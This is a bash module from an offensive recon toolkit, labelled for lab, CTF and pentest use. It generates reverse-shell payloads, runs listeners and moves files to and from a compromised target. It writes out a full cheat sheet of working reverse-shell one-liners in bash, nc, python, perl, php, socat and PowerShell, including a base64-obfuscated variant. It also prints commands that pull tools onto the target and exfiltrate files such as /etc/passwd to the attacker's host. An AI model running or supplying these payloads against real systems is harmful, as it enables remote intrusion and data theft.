#!/bin/bash
# ============================================================================
# AUTO RECON - Phase 11: Shell Handler & File Transfer (operator)
# ----------------------------------------------------------------------------
# Catch reverse shells and move files both ways during a boot2root engagement,
# straight from the menu. Prefers good tools (pwncat-cs, ncat, uploadserver)
# and falls back to plain nc / python http.server so it works on any box.
# Authorized lab / CTF / pentest use only.
# ============================================================================

shell_handler_dir() { echo "${1:-$PWD}/shells"; }

ensure_shell_handler_layout() {
    local d; d=$(shell_handler_dir "$1")
    mkdir -p "$d/loot" "$d/serve"
}

# Attacker IP — reuse the priv-esc resolver when present.
shell_attacker_ip() {
    if declare -F privesc_attacker_ip >/dev/null; then
        privesc_attacker_ip
    else
        ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' | head -1
    fi
}

# Ask for a value (TUI input when available).
_sh_ask() {
    local prompt="$1" default="$2"
    if declare -F tui_input >/dev/null; then
        tui_input "$prompt" "$default"
    else
        local v; echo -ne "  ${BOLD}${prompt} [${default}]:${NC} " >&2; read -r v
        printf '%s\n' "${v:-$default}"
    fi
}

# ── 1. Reverse-shell payload cheatsheet ────────────────────────────────────
generate_revshell_payloads() {
    local result_dir="$1"
    local lhost lport
    lhost=$(_sh_ask "Attacker IP (LHOST)" "$(shell_attacker_ip)")
    lport=$(_sh_ask "Listen port (LPORT)" "4444")
    local d; d=$(shell_handler_dir "$result_dir"); mkdir -p "$d"
    local out="${d}/revshell_${lport}.txt"

    local b64
    b64=$(printf 'bash -i >& /dev/tcp/%s/%s 0>&1' "$lhost" "$lport" | base64 -w0 2>/dev/null)

    cat > "$out" <<EOF
=== Reverse Shell Payloads (LHOST=${lhost} LPORT=${lport}) ===

# Linux
bash -i >& /dev/tcp/${lhost}/${lport} 0>&1
0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f
nc ${lhost} ${lport} -e /bin/bash
nc -e /bin/sh ${lhost} ${lport}
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
perl -e 'use Socket;\$i="${lhost}";\$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
php -r '\$s=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'
socat TCP:${lhost}:${lport} EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# Base64 (paste-safe) bash
echo ${b64} | base64 -d | bash

# Windows (PowerShell)
powershell -nop -c "\$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sby=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sby,0,\$sby.Length);\$s.Flush()}"

# Catch it with:  Shell Handler -> Start listener (port ${lport})
#   pwncat-cs -lp ${lport}    |    rlwrap nc -lvnp ${lport}    |    nc -lvnp ${lport}

# Upgrade a dumb shell:
#   python3 -c 'import pty;pty.spawn("/bin/bash")'   (or: script -qc /bin/bash /dev/null)
#   Ctrl-Z ; stty raw -echo; fg ; [Enter] ; export TERM=xterm
EOF

    log_success "Reverse-shell payloads → ${out}"
    if declare -F tui_pager >/dev/null && tui_enabled; then
        tui_pager "$out"
    else
        echo ""; sed 's/^/    /' "$out" | head -40
    fi
}

# ── 2. Listener that catches a reverse shell ───────────────────────────────
start_reverse_listener() {
    local result_dir="$1"
    local lport; lport=$(_sh_ask "Listen port" "4444")
    [[ "$lport" =~ ^[0-9]+$ ]] || { log_error "Invalid port"; return 1; }

    local tool
    tool=$(pick_tool revshell_listener pwncat-cs ncat nc 2>/dev/null) || tool="nc"
    log_info "Listener tool: ${BOLD}${tool}${NC} on port ${BOLD}${lport}${NC}  (Ctrl-C to stop)"
    log_info "On target run a payload from option [1]. Catching now..."
    echo ""
    case "$tool" in
        pwncat-cs)
            # pwncat auto-stabilises the shell and gives up/download.
            pwncat-cs -lp "$lport" ;;
        ncat)
            ncat -lvnp "$lport" ;;
        nc)
            if command -v rlwrap &>/dev/null; then
                rlwrap nc -lvnp "$lport"
            else
                nc -lvnp "$lport"
            fi ;;
    esac
    echo ""
    log_info "Listener closed."
}

# ── 3. Serve files TO target (HTTP download server) ────────────────────────
serve_files_to_target() {
    local result_dir="$1"
    ensure_shell_handler_layout "$result_dir"
    local default_dir; default_dir=$(shell_handler_dir "$result_dir")/serve
    local dir port lhost
    dir=$(_sh_ask "Directory to serve" "$default_dir")
    port=$(_sh_ask "HTTP port" "8000")
    lhost=$(shell_attacker_ip)
    [[ -d "$dir" ]] || { log_error "No such directory: $dir"; return 1; }

    log_success "Serving ${dir} on http://${lhost}:${port}/  (Ctrl-C to stop)"
    echo -e "  ${BOLD}Fetch from target:${NC}"
    echo -e "    ${DIM}Linux  :${NC} wget http://${lhost}:${port}/FILE -O /tmp/FILE"
    echo -e "    ${DIM}Linux  :${NC} curl http://${lhost}:${port}/FILE -o /tmp/FILE"
    echo -e "    ${DIM}Windows:${NC} certutil -urlcache -split -f http://${lhost}:${port}/FILE FILE"
    echo -e "    ${DIM}Windows:${NC} powershell iwr http://${lhost}:${port}/FILE -o FILE"
    echo ""
    if command -v python3 &>/dev/null; then
        python3 -m http.server "$port" --directory "$dir"
    elif command -v php &>/dev/null; then
        ( cd "$dir" && php -S "0.0.0.0:${port}" )
    else
        log_error "Need python3 or php to serve files"
        return 1
    fi
    echo ""; log_info "File server stopped."
}

# ── 4. Receive a file FROM target (upload server / nc) ─────────────────────
receive_file_from_target() {
    local result_dir="$1"
    ensure_shell_handler_layout "$result_dir"
    local loot; loot=$(shell_handler_dir "$result_dir")/loot
    local lhost; lhost=$(shell_attacker_ip)

    # Preferred: python uploadserver (HTTP POST upload).
    if python3 -c 'import uploadserver' 2>/dev/null; then
        local port; port=$(_sh_ask "Upload HTTP port" "8000")
        log_success "Upload server on http://${lhost}:${port}/  → saves into ${loot}  (Ctrl-C to stop)"
        echo -e "  ${BOLD}Send from target:${NC}"
        echo -e "    ${DIM}Linux  :${NC} curl -F 'files=@/etc/passwd' http://${lhost}:${port}/upload"
        echo -e "    ${DIM}Windows:${NC} curl.exe -F 'files=@C:\\loot.zip' http://${lhost}:${port}/upload"
        echo ""
        ( cd "$loot" && python3 -m uploadserver "$port" )
        echo ""; log_info "Upload server stopped. Loot in ${loot}"
        return 0
    fi

    # Fallback: one-shot nc receiver.
    local port; port=$(_sh_ask "Listen port (nc receiver)" "4445")
    local fname; fname=$(_sh_ask "Save received data as" "loot_$(date +%H%M%S).bin")
    local dest="${loot}/${fname}"
    log_info "uploadserver not installed (pip install uploadserver for HTTP). Using nc receiver."
    log_success "Listening on ${port} → ${dest}  (closes after one transfer)"
    echo -e "  ${BOLD}Send from target:${NC}"
    echo -e "    ${DIM}Linux  :${NC} nc ${lhost} ${port} < /path/file        ${DIM}(or: cat file > /dev/tcp/${lhost}/${port})${NC}"
    echo -e "    ${DIM}Windows:${NC} ncat ${lhost} ${port} < C:\\path\\file"
    echo ""
    if command -v ncat &>/dev/null; then
        ncat -lvnp "$port" > "$dest"
    else
        nc -lvnp "$port" > "$dest"
    fi
    if [[ -s "$dest" ]]; then
        log_success "Received $(du -h "$dest" | awk '{print $1}') → ${dest}"
    else
        log_warn "No data received."
        rm -f "$dest"
    fi
}

# ── Sub-menu orchestrator ──────────────────────────────────────────────────
run_shell_handler() {
    local ip="$1"
    local result_dir="${2:-$PWD}"
    ensure_shell_handler_layout "$result_dir"

    while true; do
        local choice
        if declare -F tui_choose >/dev/null && tui_enabled; then
            declare -F tui_screen_enter >/dev/null && tui_screen_enter
            declare -F tui_header >/dev/null && tui_header "🐚 Shell Handler & File Transfer" "LHOST: $(shell_attacker_ip)" >&2
            local sel
            sel=$(tui_choose "Chọn" \
                "1  🧬 Tạo reverse-shell payloads" \
                "2  🎧 Bật listener (bắt shell)" \
                "3  📤 Serve file → target (HTTP)" \
                "4  📥 Nhận file ← target" \
                "0  ← Quay lại menu chính")
            declare -F tui_screen_leave >/dev/null && tui_screen_leave
            choice="${sel%%[[:space:]]*}"
        else
            section_header "SHELL HANDLER & FILE TRANSFER" "$ICON_SCAN"
            echo -e "  ${CYAN}[1]${NC} 🧬 Generate reverse-shell payloads"
            echo -e "  ${CYAN}[2]${NC} 🎧 Start listener (catch shell)"
            echo -e "  ${CYAN}[3]${NC} 📤 Serve files → target (HTTP)"
            echo -e "  ${CYAN}[4]${NC} 📥 Receive file ← target"
            echo -e "  ${CYAN}[0]${NC} ← Back"
            echo -ne "  ${BOLD}Choose:${NC} "
            read -r choice
        fi

        case "$choice" in
            1) generate_revshell_payloads "$result_dir" ;;
            2) start_reverse_listener "$result_dir" ;;
            3) serve_files_to_target "$result_dir" ;;
            4) receive_file_from_target "$result_dir" ;;
            0|"") return 0 ;;
            *) log_warn "Unknown choice: $choice"; sleep 1 ;;
        esac

        if [[ "$choice" =~ ^[1-4]$ ]]; then
            echo -e "  ${YELLOW}Press Enter to continue...${NC}"
            read -r
        fi
    done
}
